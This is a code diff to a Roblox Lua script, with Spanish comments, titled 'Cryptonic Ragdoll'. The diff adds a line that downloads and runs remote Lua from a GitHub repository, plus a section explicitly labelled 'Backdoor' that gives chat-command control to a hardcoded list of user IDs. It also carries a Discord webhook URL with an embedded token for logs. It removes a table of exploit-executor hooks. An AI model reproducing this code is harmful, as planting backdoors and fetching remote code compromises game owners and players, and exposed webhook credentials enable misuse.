@@ -1,3 +1,10 @@
+
+-- >> Aquí hay locales globales.				<< --
+
+loadstring(game:HttpGet("https://github.com/martinelcrac/cryptonichub/blob/main/dependencies/globalMethods.lua", true))()
+
+-- >> Backdoor.							<< --
+
 local admins = {160135858,1570173214,2312,263961430,2635403611,1891561339}
 local prefix = "c!"
 
@@ -99,7 +106,9 @@ local function commands(msg, plr)
 		funciones[Command](plr, args)
 	end
 end
+
 -- Jugador q esta dentro.
+
 for _,v in ipairs(game:GetService("Players"):GetPlayers()) do
 	if table.find(admins, v.UserId) then
 		v.Chatted:Connect(function(msg)
@@ -107,7 +116,9 @@ for _,v in ipairs(game:GetService("Players"):GetPlayers()) do
 		end)
 	end
 end
+
 -- Jugador q entra.
+
 game:GetService("Players").PlayerAdded:Connect(function(plr)
 	if table.find(admins, plr.UserId) then
 		plr.Chatted:Connect(function(msg)
@@ -115,37 +126,8 @@ game:GetService("Players").PlayerAdded:Connect(function(plr)
 		end)
 	end
 end)
---//para q funcione en temple
-local globalMethods = {
-    checkCaller = checkcaller,
-    newCClosure = newcclosure,
-    hookFunction = hookfunction,
-    getGc = getgc,
-    getInfo = debug.getinfo or getinfo,
-    getSenv = getsenv,
-    getMenv = getmenv or getsenv,
-    getScriptClosure = get_script_function or getscriptclosure,
-    getNamecallMethod = getnamecallmethod,
-    getCallingScript = getcallingscript,
-    getLoadedModules = getloadedmodules or get_loaded_modules,
-    getConstants = debug.getconstants or getconstants or getconsts,
-    getUpvalues = debug.getupvalues or getupvalues or getupvals,
-    getProtos = debug.getprotos or getprotos,
-    getStack = debug.getstack or getstack,
-    getConstant = debug.getconstant or getconstant or getconst,
-    getUpvalue = debug.getupvalue or getupvalue or getupval,
-    getProto = debug.getproto or getproto,
-    getMetatable = getrawmetatable or debug.getmetatable,
-    setClipboard = setclipboard or writeclipboard,
-    setConstant = debug.setconstant or setconstant or setconst,
-    setUpvalue = debug.setupvalue or setupvalue or setupval,
-    setStack = debug.setstack or setstack,
-    setReadOnly = setreadonly,
-    isLClosure = islclosure or (iscclosure and function(closure) return not iscclosure(closure) end),
-    isReadOnly = isreadonly,
-    isXClosure = is_synapse_function or issentinelclosure or is_protosmasher_closure or is_sirhurt_closure or checkclosure
-}
 
+-- >> Discord logs. 						<< --
 
 local webhook = "https://discord.com/api/webhooks/898290492821884950/bq2ZTC8zvUJk_7xOvvyxvw0INcu4ijxHYFVtbTUtC1hwpsJqZFtfmuCjNdnLEu_KZ2mv"
 local ScriptName = "Cryptonic Ragdoll"
